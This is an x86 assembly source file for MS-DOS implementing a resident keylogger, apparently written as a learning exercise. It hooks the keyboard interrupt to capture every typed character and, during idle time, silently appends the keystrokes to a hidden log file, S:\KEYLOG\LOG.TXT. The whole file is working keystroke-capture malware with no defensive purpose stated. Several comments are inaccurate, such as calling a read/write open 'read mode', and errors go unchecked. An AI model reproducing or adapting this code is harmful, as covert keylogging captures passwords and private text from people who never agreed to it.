.186

.model tiny

local @@

.data

filePath db 'S:\KEYLOG\LOG.TXT', 0

old_int09h dd 0
old_int28h dd 0

buffer db 256 dup(0)

head db 0
tail db 0

tsr_mode equ 3100h
int09h_addr equ 9 * 4
int28h_addr equ 28h * 4
EndLabel:

.code
org 100h
Start:
        xor ax, ax
        mov es, ax                                  ; Set ES to 0

        cli                                         ; Disable INTs
		mov bx, int09h_addr                         ; Save address of int08h handler
		mov ax, word ptr es:[bx]
		mov cx, word ptr es:[bx+2] 
		mov word ptr cs:[old_int09h], ax            ; Save pointer to old handler
		mov word ptr cs:[old_int09h + 2], cx
		mov word ptr es:[bx], offset Int09hHandler  ; Rewrite handler
		mov ax, cs
		mov word ptr es:[bx+2], ax


        mov bx, int28h_addr                         ; Save address of int08h handler
		mov ax, word ptr es:[bx]
		mov cx, word ptr es:[bx+2] 
		mov word ptr cs:[old_int28h], ax            ; Save pointer to old handler
		mov word ptr cs:[old_int28h + 2], cx
		mov word ptr es:[bx], offset Int28hHandler  ; Rewrite handler
		mov ax, cs
		mov word ptr es:[bx+2], ax    
		sti                                         ; Enable INTs

        mov ax, tsr_mode                            ; DOS function to enable TSR
		mov dx, offset EndLabel                     ; Get program size
		shr dx, 4                                   ; Turn it into segment
		add dx, 16                                   ; Ceiling
		int 21h                                     ; Call function


;==============================================================================
; New Interrupt 28h handler
;==============================================================================
Int28hHandler   proc
        push di bx ax cx dx es ds si bp             ; Save bunch of registers
        
	pushf                                       ; Push flag register
	call dword ptr cs:[old_int28h]              ; Call original handler
		
        call saveBuffer
		
        pop bp si ds es dx cx ax bx di              ; Restore bunch of registers
	iret                                        ; End interrupt
Int28hHandler   endp


;==============================================================================
; New Interrupt 09h handler
;==============================================================================
Int09hHandler   proc
        push ax di bx                               ; Save bunch of registers
        
	pushf                                       ; Push flag register
	call dword ptr cs:[old_int09h]              ; Call original handler
		
        call updateBuffer                           ; Update key stored in buffer
		
        pop bx di ax                              ; Restore bunch of registers
	iret                                        ; End interrupt
Int09hHandler   endp


;==============================================================================
; Function that adds symbol to buffer (if present)
; DESTR: AX, DI, BX
;==============================================================================

updateBuffer    proc
        mov ah, 01h                                 ; Funtion of int 16h that checks for button and reads ASCII
        int 16h                                     ; Call function

        jz  @@noSymbol                              ; No new symbol
        cmp al, 0
        je @@noSymbol

        add byte ptr cs:[head], 1
        xor bx, bx
        mov bl, byte ptr cs:[head]

        mov di, offset buffer
        add di, bx
        mov cs:[di], al
@@noSymbol:
        ret
updateBuffer    endp

;==============================================================================
; Function that writes to file
; DESTR: AX, BX, CX, DX
;==============================================================================

saveBuffer  proc
        local oldHead:byte
        mov dl, cs:[head]
        mov cs:[oldHead], dl                        ; Keep head so it won't shift in the process
        push cs
        pop ds  
        mov dx, offset filePath                     ; DS:DX to file path 
        mov ax, 3d02h                               ; Open file in read mode
        int 21h                                     ; Call DOS function

        mov bx, ax                                  ; Move file handle to bx
        mov ax, 4202h                               ; Move to the EOF
        xor cx, cx
        xor dx, dx                                  ; CX:DX to zero so there is no shift
        int 21h                                     ; Call DOS function

        
        mov cl, cs:[oldHead]                        
        sub cl, cs:[tail]                           ; Calculate file length
        mov dx, offset buffer
        xor ax, ax
        mov al, cs:[tail]
        add dx, ax                                  ; Add shift to the beginning of the buffer               
        mov ah, 40h                                 ; Write to file 
        int 21h                                     ; Call DOS function

        mov ah, 3eh                                 ; Close file
        int 21h                                     ; Call DOS function

        mov al, cs:[oldHead]
        mov cs:[tail], al                           ; Move buffer start position
        ret 
saveBuffer  endp


debugBuffer proc
        push 0b800h
        pop es
        push cs
        pop ds
        xor di, di
        mov cx, offset buffer
        mov si, cx

        xor cx, cx
        mov cl, byte ptr cs:[head]
        sub cl, byte ptr cs:[tail]
        inc cl
        je @@End
        cmp cx, 0
@@Write:
        movsb
        inc di
        loop @@Write

@@End:
        ret
debugBuffer endp

end Start